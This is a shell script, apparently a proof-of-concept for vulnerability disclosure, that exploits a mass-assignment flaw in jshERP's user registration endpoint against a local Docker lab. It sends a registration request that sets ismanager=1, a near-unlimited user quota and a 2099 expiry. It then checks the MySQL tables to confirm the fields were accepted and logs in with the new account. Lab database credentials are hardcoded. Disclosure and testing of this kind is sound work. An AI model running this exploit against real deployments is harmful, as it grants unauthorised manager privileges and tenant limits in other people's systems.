#!/bin/sh
set -e
BASE='http://127.0.0.1:9999/jshERP-boot'
U="pocma$(date +%s)"
P='e10adc3949ba59abbe56e057f20f883e'
PAYLOAD=$(cat <<JSON
{"loginName":"$U","password":"$P","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}
JSON
)

step() {
  echo
  echo "=============================="
  echo "[STEP] $1"
  echo "=============================="
}

run() {
  echo "+ $1"
  sh -c "$1"
}

post_register() {
  payload="$1"
  echo "+ docker exec -i jsherp33-app sh -lc \"curl -s -X POST '$BASE/user/registerUser' -H 'Content-Type: application/json' --data-binary @-\""
  printf '%s' "$payload" | docker exec -i jsherp33-app sh -lc "curl -s -X POST '$BASE/user/registerUser' -H 'Content-Type: application/json' --data-binary @-"
  echo
}

step "1) 查看注册前数据库基线"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT COUNT(*) AS user_total_before FROM jsh_user; SELECT COUNT(*) AS tenant_total_before FROM jsh_tenant;\\\"\""

step "2) 发起注册请求（携带敏感字段）"
echo "[Payload]"
echo "$PAYLOAD"
post_register "$PAYLOAD"

step "3) 查看注册后用户表状态（重点看 ismanager）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='$U';\\\"\""

step "4) 查看注册后租户表状态（重点看 user_num_limit/expire_time）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='$U';\\\"\""

step "5) 登录该新账号，确认可直接使用"
run "docker exec jsherp33-app sh -lc \"curl -s -X POST '$BASE/user/login' -H 'Content-Type: application/json' -d '{\\\"loginName\\\":\\\"$U\\\",\\\"password\\\":\\\"$P\\\"}'\""

step "6) 最终数据库状态汇总"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT COUNT(*) AS user_total_after FROM jsh_user; SELECT COUNT(*) AS tenant_total_after FROM jsh_tenant;\\\"\""

echo
echo "[Context] username=$U"
